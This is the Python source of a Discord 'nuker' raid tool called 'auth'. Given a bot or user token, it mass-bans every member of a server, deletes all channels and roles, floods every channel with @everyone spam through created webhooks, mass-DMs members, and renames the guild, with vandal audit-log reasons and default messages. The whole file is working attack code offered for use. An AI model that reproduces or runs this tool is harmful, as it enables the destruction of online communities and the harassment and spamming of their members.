import ctypes
import webbrowser as wb
from os import system, path, _exit

try:
    from aiohttp import ClientSession
except ImportError:
    system('pip install aiohttp')
    from aiohttp import ClientSession
try:
    from pwinput import pwinput
except ImportError:
    system('pip install pwinput')
    from pwinput import pwinput
try:
    from pypresence import Presence
except ImportError:
    system('pip install pypresence')
    from pypresence import Presence
try:
    import httpx
except ImportError:
    system('pip install httpx')
    import httpx
try:
    from pystyle import Center
except ImportError:
    system('pip install pystyle')
    from pystyle import Center
try:
    from tasksio import TaskPool 
except ImportError:
    system('pip install tasksio')
    from tasksio import TaskPool 
try:
    import numpy as np
except ImportError:
    system('pip install numpy')
    import numpy as np
try:
    from colorama import Fore 
except ImportError:
    system('pip install colorama')
    from colorama import Fore 
try:
    from image import DrawImage
except ImportError:
    system('pip install terminal-img')
    from image import DrawImage

from asyncio import Queue, sleep as async_sleep, run
from random import randint, choice
from sys import platform, stdout, version_info
from time import strftime, sleep, time
from base64 import b64decode

if platform == "win32": 
    ctypes.windll.kernel32.SetConsoleTitleW("auth - config")
    clear = system("cls & mode 55,25")
else:
    system("clear")

def ct(t):
    global user
    r = httpx.get(f"https://discord.com/api/v10/users/@me", headers={'authorization': f'Bot {t}'})
    if r.status_code == 200:
        user = r.json()
        return "bot"
    elif r.status_code == 401:
        r = httpx.get(f"https://discord.com/api/v10/users/@me", headers={'authorization': f'{t}'})
        if r.status_code == 200:
            user = r.json()
            return "user"
        else:
            print(Center.XCenter('\ninvalid token, aborting'))
            input()
            _exit(0)           
    else:
        print(Center.XCenter('\ninvalid token, aborting'))
        input()
        _exit(0)

def cg(g):
    r = httpx.get(f"https://discord.com/api/v10/guilds/{g}", headers={'authorization': f'Bot {t}'}) 
    if r.status_code == 200:
        return "exists"
    elif "Invalid Form Body" in r.json()['message']:
        print(Center.XCenter('\ninvalid guild, aborting'))
        input()
        _exit(0)
    elif r.status_code == 401:
        r = httpx.get(f"https://discord.com/api/v10/guilds/{g}", headers={'authorization': f'{t}'}) 
        if r.status_code == 200:
            return "exists"
        else:
            print(Center.XCenter('\ninvalid guild, aborting'))
            input()
            _exit(0)
    else:
        print(Center.XCenter('\nbot is not in guild, aborting'))
        wb.open(f"https://discord.com/api/oauth2/authorize?client_id={user['id']}&permissions=8&scope=bot")
        input()
        _exit(0)

if version_info.major == 3 and version_info.minor != 9:
    try:
        t = pwinput(f""" 
                   {Fore.WHITE}┌──{Fore.MAGENTA}({Fore.WHITE}auth@token{Fore.MAGENTA}){Fore.WHITE}-{Fore.MAGENTA}[{Fore.WHITE}~{Fore.MAGENTA}]
                   {Fore.WHITE}└─$ """)
        if t in ["secured", "usual"]:
            m = "".encode('ascii')
            z = b64decode(m)
            t = z.decode('ascii')
            bot = ct(t)
        else:
            bot = ct(t)
        g = input(f""" 
                   {Fore.WHITE}┌──{Fore.MAGENTA}({Fore.WHITE}auth@guild{Fore.MAGENTA}){Fore.WHITE}-{Fore.MAGENTA}[{Fore.WHITE}~{Fore.MAGENTA}]
                   {Fore.WHITE}└─$ """)
        guild = cg(g)
    except KeyboardInterrupt:
        _exit(0)
else:
    print(Center.XCenter("python must be 3.10+ \notherwise commands wouldn't work"))
    input()

try:
    id = '885644488452743168'
    RPC = Presence(id)
    RPC.connect()
    RPC.update(buttons=[{"label": "youtube", "url": "https://www.youtube.com/channel/UCicG4fjprn6t_E1KMjR007A"}, {"label": "discord", "url": "https://discord.gg/zvevuUprHy"}], large_image='multitool', start=time(), large_text="v1.0.0")
except:
    pass

class auth: 
    def __init__(self) -> None:
        self.__version__ = "1.2.5"
        self.token = t
        self.guild = g
        self.whitelisted = ["1003643218577068112", "719887748152033352"]
        self.status = [200, 201, 204]
        self.ratelimit = 429
        self.tasks = 50
        self.queue = Queue()
        self.api = randint(9, 10)
        self.name = user['username']
        self.avatar = ["https://i.postimg.cc/66VLfSqH/31cb74cacedebbe04bf7c95b240efa83.jpg", "https://i.postimg.cc/gcB67Bkq/image.jpg", "https://i.postimg.cc/xdZjf0n1/t.jpg"]
        self.username = ['auth', 'auth-runs-this-shit', 'ran-by-auth']
        self.num = 0

        self.p = Fore.MAGENTA
        self.w = Fore.WHITE
        if bot == "bot": 
            self.bot = "bot"
            self.headers = {'authorization': f'Bot {self.token}', 'x-audit-log-reason': 'fuckedbyauth'}
        elif bot == "user":
            self.bot = "user"
            self.headers = {'authorization': f'{self.token}', 'x-audit-log-reason': 'fuckedbyauth'}
        self.banner = f"""
           {self.p}█████{self.w}╗  {self.p}██{self.w}╗   {self.p}██{self.w}╗ {self.p}████████{self.w}╗ {self.p}██{self.w}╗  {self.p}██{self.w}╗
          {self.p}██{self.w}╔══{self.p}██{self.w}╗ {self.p}██{self.w}║   {self.p}██{self.w}║ {self.w}╚══{self.p}██{self.w}╔══╝ {self.p}██{self.w}║  {self.p}██{self.w}║
          {self.p}███████{self.w}║ {self.p}██{self.w}║   {self.p}██{self.w}║    {self.p}██{self.w}║    {self.p}███████{self.w}║
          {self.p}██{self.w}╔══{self.p}██{self.w}║ {self.p}██{self.w}║   {self.p}██{self.w}║    {self.p}██{self.w}║    {self.p}██{self.w}╔══{self.p}██{self.w}║
          {self.p}██{self.w}║  {self.p}██{self.w}║ ╚{self.p}██████{self.w}╔╝    {self.p}██{self.w}║    {self.p}██{self.w}║ {self.p} ██{self.w}║
          {self.w}╚═╝  ╚═╝  ╚═════╝     ╚═╝    ╚═╝  ╚═╝
                                  
    {self.p}╔═══════════════════════╗     
    {self.p}║ {self.w}[{self.p}1{self.w}] :massban          {self.p}║  ╔════════════════════╗ 
    {self.p}║ {self.w}[{self.p}2{self.w}] :webhook spam     {self.p}║  ║ {self.w}[{self.p}7{self.w}] :massdm        {self.p}║
    {self.p}║ {self.w}[{self.p}3{self.w}] :create channels  {self.p}║  ║ {self.w}[{self.p}8{self.w}] :massunban     {self.p}║
    {self.p}║ {self.w}[{self.p}4{self.w}] :delete channels  {self.p}║  ║ {self.w}[{self.p}9{self.w}] :rename        {self.p}║
    {self.p}║ {self.w}[{self.p}5{self.w}] :create roles     {self.p}║  ║ {self.w}[{self.p}0{self.w}] :credits       {self.p}║
    {self.p}║ {self.w}[{self.p}6{self.w}] :delete roles     {self.p}║  ║ {self.w}[{self.p}z{self.w}] :exit          {self.p}║
    {self.p}╚═══════════════════════╝  ╚════════════════════╝
    """

    def log(self, type : None, text : str):
        match type:
            case "1":
                type = "created" 
            case "2":
                type = "deleted"
            case "3":
                type = "shipped"
            case "4":
                type = "banned"
            case "5":
                type = "unbanned"
            case "6":
                type = "renamed"
            case "0":
                type = "ratelimited for"

        print(f"\t{self.p}[{self.w}{strftime('%H:%M:%S')}{self.p}]{self.w} ~ {type} {self.p}{text}")

    def err(self, t):
        print(Center.XCenter(f"\n{t}"))

    def title(self, t):
        if platform == "win32":
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        elif platform == "linux":
            stdout.write(t)
        else:
            t = None

    def write(self, t, amnt : None):
        if amnt is None:
            amnt = 0.02
        for text in t:
            sleep(amnt)
            stdout.write(text)
            stdout.flush()

    def animation(self):
        animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
        for i in range(20):
            sleep(0.1)
            stdout.write(f"\r\t\t   {self.w}[{self.p}~{self.w}]" + animation[i % len(animation)]) 
            stdout.flush()

    def clear(self, cols : None, lines : None):
        if cols == None or lines == None:
            cols = "57"
            lines = "25"
        if platform == "win32": 
           system(f"cls & mode {cols},{lines}")
        else:
           system("clear")

    def reset(self):
        self.num = 0

    async def chg(self):
        global g
        self.guild = input(f""" 
                   {self.w}┌──{self.p}({self.w}auth@guild{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)
        g = cg(self.guild)
        if g == "exists":
            self.animation()
            await self.startup()

    async def cht(self):
        global t
        self.token = pwinput(f""" 
                   {self.w}┌──{self.p}({self.w}auth@token{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)
        t = ct(self.token)
        if t == "bot":
            self.name = user['username']
            self.bot = "bot"
            self.animation()
            await self.startup()
        elif t == "user":
            self.name = user['username']
            self.bot = "user"
            self.animation()
            await self.startup()

    async def mb(self, m):
        while 1:
            async with ClientSession(headers=self.headers) as s:
                async with s.put(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/bans/{m}") as r:
                    if "retry_after" in await r.text():
                        json = await r.json(content_type=None)
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="4", text=m)
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")    
                        break

    async def ub(self, m):
        while 1:
            async with ClientSession(headers=self.headers) as s:
                async with s.delete(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/bans/{m}") as r:
                    if "retry_after" in await r.text():
                        json = await r.json(content_type=None)
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="5", text=m)
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def crw(self, ch):
        while 1:
            j = {'name': choice(self.username), "avatar_url": choice(self.avatar)}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f'https://discord.com/api/v{self.api}/channels/{ch}/webhooks', json=j) as r:
                    if r.status in self.status:
                        wh = await r.json(content_type=None)
                        self.log(type="1", text=f"{wh['id']}")
                    break
                        
    async def sndw(self, wh, msg, a, id):
        for _ in range(int(a)):
            j = {"content": msg, "username": choice(self.username), "avatar_url": choice(self.avatar)}
            async with ClientSession() as s:
                async with s.post(wh, json=j) as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="3", text=id)
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")

    async def cc(self, n, t):
        while 1:
            j = {"name": n, "type": t}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f'https://discord.com/api/v{self.api}/guilds/{self.guild}/channels', json=j) as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="1", text=f"{json['id']}")
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def dc(self, c):
        while 1:
            async with ClientSession(headers=self.headers) as s:
                async with s.delete(f"https://discord.com/api/v{self.api}/channels/{c}") as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="2", text=f"{json['id']}")
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def cr(self, n): 
        while 1:
            j = {"name": n, "color": 0x662b71}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f'https://discord.com/api/v{self.api}/guilds/{self.guild}/roles', json=j) as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="1", text=f"{json['id']}")
                            self.num += 1         
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def dr(self, c):
        while 1:
            async with ClientSession(headers=self.headers) as s:
                async with s.delete(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/roles/{c}") as r:
                    json = await r.json(content_type=None)
                    if "retry_after" in await r.text():
                        self.log(type="0", text=f"{json['retry_after']}s")
                    else:
                        if r.status in self.status:
                            self.log(type="2", text=c)
                            self.num += 1
                        elif r.status == self.ratelimit:
                            self.log(type="0", text=f"{json['retry_after']}s")
                        break

    async def dm(self, m, ch):
        while 1:
            j = {'content': m}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f"https://discord.com/api/v{self.api}/channels/{ch}/messages", json=j) as r:
                    json = await r.json(content_type=None)
                    if r.status in self.status:
                        self.log(type="3", text=f"{json['id']}")
                        self.num += 1
                    break

    async def cdm(self, u):
        self.ids = []
        while 1:
            j = {"recipient_id": u}
            async with ClientSession(headers=self.headers) as s:
                async with s.post(f"https://discord.com/api/v{self.api}/users/@me/channels", json=j) as r:
                    json = await r.json(content_type=None)
                    if r.status in self.status:
                        self.log(type="1", text=f"{json['id']}")
                        self.ids.append(json['id'])            
                    break

    async def rg(self, n):
        j = {'name': n}
        async with ClientSession(headers=self.headers) as s:
            async with s.patch(f"https://discord.com/api/v{self.api}/guilds/{self.guild}", json=j) as r:
                json = await r.json(content_type=None)
                if r.status in self.status:
                    self.log(type="6", text=json['id'])
                    self.num += 1

    async def mbexec(self):
        z = input(f""" 
                   {self.w}┌──{self.p}({self.w}ban@ids(y/n){self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """).lower()

        if z.startswith("y"):    
            self.clear(cols=54, lines=25)       
            self.title(f"auth - massban (ids)")
            if path.exists('core/ids.txt'):
                members = open("core/ids.txt").read().split("\n")
            else:
                self.err("core/ids.txt dosen't exists")
                input()
                await self.menu()
            
            async with TaskPool(workers=self.tasks) as q:
                for m in np.array(list(members)):
                    if m in self.whitelisted:
                        self.log(type="skipped", text=f"{m}")
                    await q.put(self.mb(m))
                    try:
                        await self.queue.join()
                    except:
                        continue

        elif z.startswith("n"):
            self.clear(cols=54, lines=25)
            self.title("auth - massban")

            async with TaskPool(workers=self.tasks) as q:
                async with ClientSession(headers=self.headers) as s:
                    async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/members?limit=1000") as r:
                        members = await r.json(content_type=None)

                for m in np.array(list(members)):
                    if m['user']['id'] in self.whitelisted:
                        self.log(type="skipped", text=f"{m}")
                    await q.put(self.mb(m['user']['id']))
                    try:
                        await self.queue.join()
                    except:
                        continue
        else:
            await self.menu()

        self.log(type="4", text=f"{self.num}/{len(members)} {self.w}users")
        await async_sleep(1.5)

    async def ubexec(self):
        self.clear(cols=56, lines=25)
        self.title(f"auth - massunban")

        async with TaskPool(workers=self.tasks) as q:
            async with ClientSession(headers=self.headers) as s:
                async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/bans") as r:
                    members = await r.json(content_type=None)

            for m in np.array(list(members)):
                await q.put(self.ub(m['user']['id']))        
                try:
                   await self.queue.join()
                except:
                    continue 
                
        self.log(type="5", text=f"{self.num}/{len(members)} {self.w}users")
        await async_sleep(1.5)

    async def whexec(self):
        m = input(f""" 
                   {self.w}┌──{self.p}({self.w}{self.name}@msg{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)
        a = input(f""" 
                   {self.w}┌──{self.p}({self.w}{self.name}@amnt{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)

        if not a.strip().isdigit():
            self.err("amnt should be int")
            await async_sleep(2)
            await self.menu()

        elif a == "" or m == "":
            self.err("there's an empty input")
            await async_sleep(2)
            await self.menu()

        else:
            self.clear(cols=56, lines=25)
            self.title("auth - webhook spam")

            if m in ["usual", "vile", "automatic"]:
                m = "@everyone vile was here https://www.youtube.com/channel/UCicG4fjprn6t_E1KMjR007A"
            
            elif "@everyone" not in m.split():
                m = m.replace(m, f"@everyone {m}")

            async with TaskPool(workers=self.tasks) as q:
                async with ClientSession(headers=self.headers) as s:
                    async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/channels") as r:
                        channels = await r.json(content_type=None)
        
                for ch in np.array(list(channels)):
                    await q.put(self.crw(ch['id']))  
                    try:
                        await self.queue.join()
                    except:
                        continue

            async with TaskPool(workers=self.tasks) as q:
                async with ClientSession(headers=self.headers) as s:
                    async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/webhooks") as r:
                        webhooks = await r.json(content_type=None)

                for wh in np.array(list(webhooks)):
                    whs = f"https://discord.com/api/webhooks/{wh['id']}/{wh['token']}"
                    await q.put(self.sndw(whs, m, a, wh['id']))
                    try:     
                        await self.queue.join()
                    except:
                        continue

            self.log(type="3", text=f"{self.num}/{int(a)*len(channels)} {self.w}messages")
            await async_sleep(1.5)

    async def dcexec(self):
        self.clear(cols=56, lines=25)
        self.title("auth - delete channels")
        async with TaskPool(workers=self.tasks) as q:
            async with ClientSession(headers=self.headers) as s:
                async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/channels") as r:
                    channels = await r.json(content_type=None)

            for ch in np.array(list(channels)):
                await q.put(self.dc(ch['id']))
                try:
                    await self.queue.join()
                except:
                    continue

        self.log(type="2", text=f"{self.num}/{len(channels)} {self.w}channels")
        await async_sleep(1.5)

    async def ccexec(self):
        n = input(f""" 
                   {self.w}┌──{self.p}({self.w}{self.name}@name{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)
        t = input(f"""
                   {self.w}┌──{self.p}({self.w}text@voice{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """).lower()
        a = input(f""" 
                   {self.w}┌──{self.p}({self.w}{self.name}@amnt{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)

        if not a.strip().isdigit():
            self.err("amnt should be int")
            await async_sleep(2)
            await self.menu()

        elif n == "" or a == "":
            self.err("there's an empty input")
            await async_sleep(2)
            await self.menu()

        else:
            if t.startswith("t"):
                t = 0
            elif t.startswith("v"):
                t = 2
            else:
                t = 0

            self.clear(cols=56, lines=25)
            self.title("auth - create channels")
            async with TaskPool(workers=self.tasks) as q:
                for _ in range(int(a)):
                    await q.put(self.cc(n, t))
                    try:
                        await self.queue.join()
                    except:
                       continue

            self.log(type="1", text=f"{self.num}/{int(a)} {self.w}channels")
            await async_sleep(1.5)

    async def drexec(self):
        self.clear(cols=56, lines=25)
        self.title("auth - delete roles")
        async with TaskPool(workers=self.tasks) as q:
            async with ClientSession(headers=self.headers) as s:
                async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/roles") as r:
                    roles = await r.json(content_type=None)

            for r in np.array(list(roles)):
                await q.put(self.dr(r['id']))
                try:
                    await self.queue.join()
                except:
                    continue

        self.log(type="2", text=f"{self.num}/{len(roles)} {self.w}roles")
        await async_sleep(1.5)

    async def crexec(self):
        n = input(f""" 
                   {self.w}┌──{self.p}({self.w}{self.name}@name{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)
        a = input(f""" 
                   {self.w}┌──{self.p}({self.w}{self.name}@amnt{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)

        if not a.strip().isdigit():
            self.err("amnt should be int")
            await async_sleep(2)
            await self.menu()

        elif n == "" or a == "":
            self.err("there's an empty input")
            await async_sleep(2)
            await self.menu()

        self.clear(cols=56, lines=25)
        self.title("auth - create roles")
        async with TaskPool(workers=self.tasks) as q:
            for _ in range(int(a)):
                await q.put(self.cr(n))
                try:
                    await self.queue.join()
                except:
                    continue

        self.log(type="1", text=f"{self.num}/{int(a)} {self.w}roles")
        await async_sleep(1.5)

    async def dmexec(self):
        m = input(f""" 
                   {self.w}┌──{self.p}({self.w}{self.name}@msg{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)

        if m == "":
            m = "got ran by auth"

        self.clear(cols=56, lines=25)
        self.title("auth - massdm")

        async with TaskPool(workers=self.tasks) as q:
            async with ClientSession(headers=self.headers) as s:
                async with s.get(f"https://discord.com/api/v{self.api}/guilds/{self.guild}/members?limit=1000") as r:
                    members = await r.json(content_type=None)

            for u in np.array(list(members)):
                await q.put(self.cdm(u['user']['id']))
                try:
                    await self.queue.join()
                except:
                    continue
        
        async with TaskPool(workers=self.tasks) as q:
            for u in np.array(self.ids):
                await q.put(self.dm(m, u))
                try:
                    await self.queue.join()
                except:
                    continue

        self.log(type="messaged", text=f"{self.num}/{len(members)} {self.w}members")
        await async_sleep(1.5)

    async def rexec(self):
        n = input(f""" 
                   {self.w}┌──{self.p}({self.w}guild@name{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)
        
        if n == "":
            self.err("there's an empty input")
            await async_sleep(2)
            await self.menu()

        else:
            self.clear(cols=56, lines=25)
            await self.rg(n)

    async def thread(self):
        x = input(f""" 
                   {self.w}┌──{self.p}({self.w}thread@amnt{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """)

        if not x.strip().isdigit():
            self.err("amnt should be int")
            await async_sleep(2)
            await self.menu()
        elif 100 < int(x):
            if user['id'] != "947389992236359720" or user['id'] != "1004076754765353030":
                self.err("you can't use threads above 100")
                await async_sleep(2)
                await self.menu()
            else:
                self.tasks = int(x)
        else:
            self.tasks = int(x)

    async def creds(self):
        self.clear(cols=None, lines=None)
        self.title(f"auth - credits : v{self.__version__}")
        self.write(f"""\n
                   {self.p}[{self.w}discord{self.p}] {self.w}vile#2072
                   {self.p}[{self.w}youtube{self.p}] {self.w}syn""", amnt=0.000001)

        for i in range(8, -1, -1):
            await async_sleep(1)
            self.title(f"auth - credits : {i}")

    async def menu(self):
        self.clear(cols=None, lines=None)
        self.title(f"auth - {self.bot} : {self.name}")
        print(self.banner)
        op = input(f""" 
                   {self.w}┌──{self.p}({self.w}{self.name}@choice{self.p}){self.w}-{self.p}[{self.w}~{self.p}]
                   {self.w}└─$ """).lower()

        op = op.replace(" ", "-") 

        match op.split():
            case ["1" | "mb" | "massban"]:
                await self.mbexec()
                self.reset()
                await self.menu()
            case ["2" | "whspam" | "webhook-spam"]:
                await self.whexec()
                self.reset()
                await self.menu()
            case ["3" | "cc" | "create-channels"]:
                await self.ccexec()
                self.reset()
                await self.menu()    
            case ["4" | "dc" | "delete-channels"]:
                await self.dcexec()
                self.reset()
                await self.menu()
            case ["5" | "cr" | "create-roles"]:
                await self.crexec()
                self.reset()
                await self.menu()
            case ["6" | "dr" | "delete-roles"]:
                await self.drexec()
                self.reset()
                await self.menu()
            case ["7" | "massdm" | "dmall"]:
                await self.dmexec()
                self.reset()
                self.ids.clear()
                await self.menu()
            case ["8" | "ub" | "massunban" | "unbanall"]:
                await self.ubexec()
                self.reset()
                await self.menu()
            case ["9" | "rename"]:
                await self.rexec()
                sleep(0.3)
                await self.menu()
            case ["thread" | "threads" | "change-threads" | "tasks"]:
                await self.thread()
                sleep(0.3)
                await self.menu()
            case ["0" | "creds" | "credits"]:
                await self.creds()
                sleep(1)
                await self.startup()
            case ["cls" | "clear"]:
                self.clear(cols=None, lines=None)
                await self.menu()
            case ["chg" | "change-guild" | "guild"]:
                await self.chg()
            case ["cht" | "change-token" | "token"]:
                await self.cht()
            case ["z" | "exit" | "x"]:
                _exit(0)
            case _:
                self.err(f"{op} : command not found")
                await async_sleep(1)
                await self.menu()

    async def startup(self):
        self.clear(cols=60, lines=26)
        self.title(" ")
        try:
            if path.exists('core/auth.jpeg'):
                image = DrawImage.from_file("core/auth.jpeg")
                image.draw_image()
                await async_sleep(1.5)
                await self.menu()
            else:
                image = DrawImage.from_url("https://i.postimg.cc/66VLfSqH/31cb74cacedebbe04bf7c95b240efa83.jpg")
                image.draw_image()
                await async_sleep(1.5)
                await self.menu()
        except (Exception, RuntimeError, TypeError) as e:
            self.err(e)
        except KeyboardInterrupt:
            _exit(0)

if __name__ == "__main__":
    try:
        auth().title("auth - booting up")
        auth().animation()
        run(auth().startup())
    except KeyboardInterrupt:
        _exit(0)
